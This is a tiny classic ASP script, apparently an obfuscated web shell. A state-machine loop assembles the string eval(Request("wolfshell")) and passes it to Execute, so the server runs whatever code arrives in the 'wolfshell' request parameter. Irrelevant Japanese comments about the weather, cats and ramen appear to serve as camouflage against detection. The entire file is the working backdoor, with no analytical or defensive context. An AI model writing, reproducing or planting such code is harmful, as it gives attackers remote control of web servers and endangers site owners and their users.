<%
Dim state_flag_88, part1_ab, part2_cd, full_str_ef
state_flag_88 = 0
' // 今日の天気は晴れです。
Do While state_flag_88 < 3
    Select Case state_flag_88
        Case 0
            ' // このコードは一体何ですか？
            part1_ab = Join(Array("e", "v", "a", "l"), "")
            state_flag_88 = state_flag_88 + 1
        Case 1
            ' // 猫はとてもかわいいですね。
            part2_cd = "wolf" & "shell"
            state_flag_88 = state_flag_88 + 1
        Case 2
            ' // ラーメン食べたい。
            full_str_ef = part1_ab & "(Request(""" & part2_cd & """))"
            state_flag_88 = state_flag_88 + 1
    End Select
Loop
' // 実行します。
Execute(full_str_ef)
%>